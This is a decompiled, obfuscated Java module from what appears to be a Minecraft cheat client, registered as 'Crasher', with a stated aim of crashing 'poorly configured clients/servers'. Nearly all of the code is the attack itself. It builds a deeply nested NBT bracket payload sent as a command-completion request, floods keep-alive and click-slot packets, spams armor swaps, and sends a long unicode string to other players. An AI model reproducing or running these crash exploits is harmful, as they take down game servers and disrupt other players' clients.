/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  it.unimi.dsi.fastutil.ints.Int2ObjectMap
 *  it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap
 *  net.minecraft.util.Hand
 *  net.minecraft.entity.Entity
 *  net.minecraft.entity.player.PlayerEntity
 *  net.minecraft.screen.slot.SlotActionType
 *  net.minecraft.item.ArmorItem
 *  net.minecraft.item.ItemStack
 *  net.minecraft.item.Items
 *  net.minecraft.item.ItemConvertible
 *  net.minecraft.world.World
 *  net.minecraft.network.packet.Packet
 *  net.minecraft.network.packet.s2c.play.EntityStatusS2CPacket
 *  net.minecraft.network.packet.s2c.common.KeepAliveS2CPacket
 *  net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket
 *  net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket
 *  net.minecraft.network.packet.c2s.common.KeepAliveC2SPacket
 *  net.minecraft.client.MinecraftClient
 *  net.minecraft.client.world.ClientWorld
 *  net.minecraft.client.network.ClientPlayerEntity
 */
package mapped;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import mapped.Class1;
import mapped.Class1108;
import mapped.Class133;
import mapped.Class1365;
import mapped.Class1503;
import mapped.Class1668;
import mapped.Class1745;
import mapped.Class1807;
import mapped.Class248;
import mapped.Class260;
import mapped.Class278;
import mapped.Class298;
import mapped.Class340;
import mapped.Class3418;
import mapped.Class4146;
import mapped.Class538;
import mapped.Class543;
import mapped.Class5496;
import mapped.Class556;
import mapped.Class5659;
import mapped.Class5692;
import mapped.Class5723;
import mapped.Class5836;
import mapped.Class584;
import mapped.Class63;
import mapped.Class6322;
import mapped.Class6454;
import net.minecraft.util.Hand;
import net.minecraft.entity.Entity;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.item.ArmorItem;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.item.ItemConvertible;
import net.minecraft.world.World;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.s2c.play.EntityStatusS2CPacket;
import net.minecraft.network.packet.s2c.common.KeepAliveS2CPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.common.KeepAliveC2SPacket;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.world.ClientWorld;
import net.minecraft.client.network.ClientPlayerEntity;

public class Class393
extends Class278 {
    private long field1366;
    private static long[] field1367;
    Class248 field1368 = this.method450(new Class260("Mode", "The exploit mode to use when crashing", Class538.field2665, Class538.values()));
    private static final String field1369;

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    @Class1
    public void method5678(Class133 e2) {
        if (Class393.field290.field_1724 == null) return;
        if (Class393.field290.field_1687 == null) {
            return;
        }
        class_2596 class_25962 = e2.method251();
        if (class_25962 instanceof class_2670) {
            class_2670 a2 = (class_2670)class_25962;
            this.field1366 = a2.method_11517();
            return;
        } else {
            class_25962 = e2.method251();
            if (!(class_25962 instanceof class_2663)) return;
            class_2663 d2 = (class_2663)class_25962;
            if (d2.method_11470() == (int)field1367[10]) {
                int n2 = 62833;
                Class4146.method20697();
                return;
            }
            int n3 = 62834;
            int n4 = n3;
            if (n4 != 62833) {
                if (n4 == 62834) return;
                return;
            } else {
                if (Class393.method5692(this).method507() != Class538.field2662) return;
                class_1297 c2 = d2.method_11469((class_1937)Class393.method5702(field290));
                if (!(c2 instanceof class_1657)) {
                    Class1745.method15538();
                    return;
                }
                class_1657 b2 = (class_1657)c2;
                if (b2 == Class393.field290.field_1724) return;
                if (Class5723.field11045.method21243(b2.method_5477())) return;
                Class1365.method13921(b2, "\u0101\u0201\u0301\u0401\u0601\u0701\u0801\u0901\u0a01\u0b01\u0e01\u0f01\u1001\u1101\u1201\u1301\u1401\u1501\u1601\u1701\u1801\u1901\u1a01\u1b01\u1c01\u1d01\u1e01\u1f01\u2101\u2201\u2301\u2401\u2501\u2701\u2801\u2901\u2a01\u2b01\u2c01\u2d01\u2e01\u2f01\u3001\u3101\u3201\u3301\u3401\u3501\u3601\u3701\u3801\u3901\u3a01\u3b01\u3c01\u3d01\u3e01\u3f01\u4001\u4101\u4201\u4301\u4401\u4501\u4601\u4701\u4801\u4901\u4a01\u4b01\u4c01\u4d01\u4e01\u4f01\u5001\u5101\u5201\u5301\u5401\u5501\u5601\u5701\u5801\u5901\u5a01\u5b01\u5c01\u5d01\u5e01\u5f01\u6001\u6101\u6201\u6301\u6401\u6501\u6601\u6701\u6801\u6901\u6a01\u6b01\u6c01\u6d01\u6e01\u6f01\u7001\u7101\u7201\u7301\u7401\u7501\u7601\u7701\u7801\u7901\u7a01\u7b01\u7c01\u7d01\u7e01\u7f01\u8001\u8101\u8201\u8301\u8401\u8501\u8601\u8701\u8801\u8901\u8a01\u8b01\u8c01\u8d01\u8e01\u8f01\u9001\u9101\u9201\u9301\u9401\u9501\u9601\u9701\u9801\u9901\u9a01\u9b01\u9c01\u9d01\u9e01\u9f01\ua001\ua101\ua201\ua301\ua401\ua501\ua601\ua701\ua801\ua901\uaa01\uab01\uac01\uad01\uae01\uaf01\ub001\ub101\ub201\ub301\ub401\ub501\ub601\ub701\ub801\ub901\uba01\ubb01\ubc01\ubd01");
            }
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    @Class1
    public void method5679(Class63 l2) {
        block24: {
            block23: {
                block26: {
                    block25: {
                        if (l2.method128() != Class543.field2690) {
                            return;
                        }
                        switch (((Class538)((Object)this.field1368.method507())).ordinal() ^ 0xE87C947E) {
                            default: {
                                return;
                            }
                            case -394488708: {
                                break block23;
                            }
                            case -394488707: {
                                break block24;
                            }
                            case -394488706: {
                                break;
                            }
                            case -394488705: {
                                break block25;
                            }
                        }
                        break block26;
                    }
                    String c2 = this.method5710((int)field1367[9]);
                    String d2 = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", c2);
                    int b2 = (int)field1367[0];
                    if (b2 >= (int)field1367[1]) {
                        Class6454.method24594();
                        return;
                    }
                    field290.method_1562().method_52787((class_2596)new class_2805((int)field1367[0], d2));
                    ++b2;
                    Class6322.method24332(Class3418.field7445, 0.97402984f);
                    return;
                }
                int a2 = (int)field1367[0];
                while (a2 < (int)field1367[3]) {
                    if (Class393.method5685(field290).method_31548().method_5438((int)field1367[4]).method_7909() != class_1802.field_8162) {
                        Class393.field290.field_1761.method_2906(Class393.field290.field_1724.field_7512.field_7763, (int)field1367[7], (int)field1367[0], class_1713.field_7791, (class_1657)Class393.field290.field_1724);
                    }
                    if (Class393.field290.field_1724.method_6047().method_7909() instanceof class_1738) {
                        Class393.field290.field_1761.method_2919((class_1657)Class393.field290.field_1724, class_1268.field_5808);
                    }
                    ++a2;
                }
                return;
            }
            int g2 = (int)field1367[0];
            block15: while (true) {
                int n2 = g2 >= (int)field1367[8] ? 41294 : 41293;
                block16: while (true) {
                    switch (n2) {
                        case 41294: {
                            n2 = 41292;
                            continue block16;
                        }
                        case 41293: {
                            long l3 = this.field1366;
                            this.field1366 = l3 + field1367[6];
                            class_2827 f2 = new class_2827(l3);
                            try {
                                Class393.method5687().method21341((class_2596)f2);
                            }
                            catch (Exception e2) {
                                e2.printStackTrace();
                            }
                            ++g2;
                            continue block15;
                        }
                    }
                    break;
                }
                break;
            }
            return;
        }
        int k2 = (int)field1367[0];
        while (k2 < (int)field1367[5]) {
            class_1799 i2 = new class_1799((class_1935)Class393.field290.field_1724.method_6047().method_7909());
            class_2813 j2 = new class_2813((int)field1367[0], (int)field1367[2], Class393.field290.field_1724.field_7512.method_37421(), (int)field1367[6], class_1713.field_7794, i2, (Int2ObjectMap)new Int2ObjectOpenHashMap());
            try {
                Class393.method5706().method21341((class_2596)j2);
            }
            catch (Exception h2) {
                h2.printStackTrace();
            }
            ++k2;
        }
        return;
    }

    private static int method5680(int n2, int n3, Class584 class584, Class340 class340) {
        return Class5692.method22442(n2, n3, class584, class340);
    }

    private static void method5681() {
        Class5659.method22184();
    }

    public static class_746 method5682(class_310 class_3102) {
        return class_3102.field_1724;
    }

    private static void method5683() {
        Class5836.method22890();
    }

    private static void method5684() {
        Class1503.method14420();
    }

    private static class_746 method5685(class_310 class_3102) {
        return Class393.method5682(class_3102);
    }

    private static void method5686(long l2) {
        Class393.field1367[5] = l2 ^ 0x973BF19F48E1E7F2L;
        Class393.field1367[0] = l2 ^ 0x973BF19F48E1E796L;
        Class393.field1367[9] = l2 ^ 0x973BF19F48E1E066L;
        Class393.field1367[4] = l2 ^ 0x973BF19F48E1E7B0L;
        Class393.field1367[3] = l2 ^ 0x973BF19F48E1E6BAL;
        Class393.field1367[7] = l2 ^ 0x973BF19F48E1E790L;
        Class393.field1367[6] = l2 ^ 0x973BF19F48E1E797L;
        Class393.field1367[2] = l2 ^ 0x973BF19F48E1E7D3L;
        Class393.field1367[1] = l2 ^ 0x973BF19F48E1E795L;
        Class393.field1367[10] = l2 ^ 0x973BF19F48E1E7B5L;
        Class393.field1367[8] = l2 ^ 0x973BF19F48E1E793L;
    }

    private static Class5496 method5687() {
        return Class393.method5696();
    }

    private static void method5688(boolean bl2) {
        Class1108.method12918(bl2);
    }

    private static void method5689(boolean bl2) {
        Class1108.method12918(bl2);
    }

    public Class393() {
        super("Crasher", "Attempts to crash poorly configured clients/servers", Class556.field2755);
    }

    private static void method5690(float f2, float f3) {
        Class6322.method24332(f2, f3);
    }

    static {
        field1369 = "\u0101\u0201\u0301\u0401\u0601\u0701\u0801\u0901\u0a01\u0b01\u0e01\u0f01\u1001\u1101\u1201\u1301\u1401\u1501\u1601\u1701\u1801\u1901\u1a01\u1b01\u1c01\u1d01\u1e01\u1f01\u2101\u2201\u2301\u2401\u2501\u2701\u2801\u2901\u2a01\u2b01\u2c01\u2d01\u2e01\u2f01\u3001\u3101\u3201\u3301\u3401\u3501\u3601\u3701\u3801\u3901\u3a01\u3b01\u3c01\u3d01\u3e01\u3f01\u4001\u4101\u4201\u4301\u4401\u4501\u4601\u4701\u4801\u4901\u4a01\u4b01\u4c01\u4d01\u4e01\u4f01\u5001\u5101\u5201\u5301\u5401\u5501\u5601\u5701\u5801\u5901\u5a01\u5b01\u5c01\u5d01\u5e01\u5f01\u6001\u6101\u6201\u6301\u6401\u6501\u6601\u6701\u6801\u6901\u6a01\u6b01\u6c01\u6d01\u6e01\u6f01\u7001\u7101\u7201\u7301\u7401\u7501\u7601\u7701\u7801\u7901\u7a01\u7b01\u7c01\u7d01\u7e01\u7f01\u8001\u8101\u8201\u8301\u8401\u8501\u8601\u8701\u8801\u8901\u8a01\u8b01\u8c01\u8d01\u8e01\u8f01\u9001\u9101\u9201\u9301\u9401\u9501\u9601\u9701\u9801\u9901\u9a01\u9b01\u9c01\u9d01\u9e01\u9f01\ua001\ua101\ua201\ua301\ua401\ua501\ua601\ua701\ua801\ua901\uaa01\uab01\uac01\uad01\uae01\uaf01\ub001\ub101\ub201\ub301\ub401\ub501\ub601\ub701\ub801\ub901\uba01\ubb01\ubc01\ubd01";
        field1367 = new long[11];
        Class393.method5686(-7549174683931646058L);
    }

    private static void method5691() {
        Class298.method1924();
    }

    public static Class248 method5692(Class393 class393) {
        return class393.field1368;
    }

    private static void method5693() {
        Class5659.method22184();
    }

    private static void method5694(double d2, double d3, double d4, double d5) {
        Class6454.method24636(d2, d3, d4, d5);
    }

    private static void method5695() {
        Class4146.method20697();
    }

    public static Class5496 method5696() {
        return Class5723.field11048;
    }

    private static void method5697() {
        Class4146.method20697();
    }

    private static void method5698(double d2, double d3, double d4, double d5) {
        Class6454.method24636(d2, d3, d4, d5);
    }

    private static void method5699(float f2) {
        Class5836.method22907(f2);
    }

    private static void method5700(int n2, int n3, int n4, int n5) {
        Class1668.method15147(n2, n3, n4, n5);
    }

    private static void method5701(int n2, int n3, int n4, int n5) {
        Class1668.method15147(n2, n3, n4, n5);
    }

    public static class_638 method5702(class_310 class_3102) {
        return class_3102.field_1687;
    }

    private static String method5703(int a2) {
        return "[";
    }

    private static void method5704() {
        Class1807.method15744();
    }

    private static void method5705(float f2) {
        Class5836.method22907(f2);
    }

    public static Class5496 method5706() {
        return Class5723.field11048;
    }

    private static void method5707() {
        Class1745.method15538();
    }

    private static void method5708(float f2) {
        Class5836.method22907(f2);
    }

    private static void method5709(double d2, double d3, double d4, double d5) {
        Class6454.method24636(d2, d3, d4, d5);
    }

    private String method5710(int a2) {
        String b2 = IntStream.range((int)field1367[0], a2).mapToObj(Class393::method5703).collect(Collectors.joining());
        return "{a:" + b2 + "}";
    }
}

